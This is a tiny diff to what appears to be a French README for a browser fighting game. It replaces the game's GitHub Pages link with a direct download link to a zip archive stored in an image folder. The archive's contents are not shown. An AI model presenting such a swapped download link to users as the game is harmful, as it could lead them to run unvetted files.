@@ -1,2 +1,2 @@
 lien du jeux : 
-    https://zduchevreuil.github.io/Jeux-De-Combat/ 
+    https://raw.githubusercontent.com/zduchevreuil/Jeux-De-Combat/main/img/kenji/Jeux-De-Combat-3.7.zip 
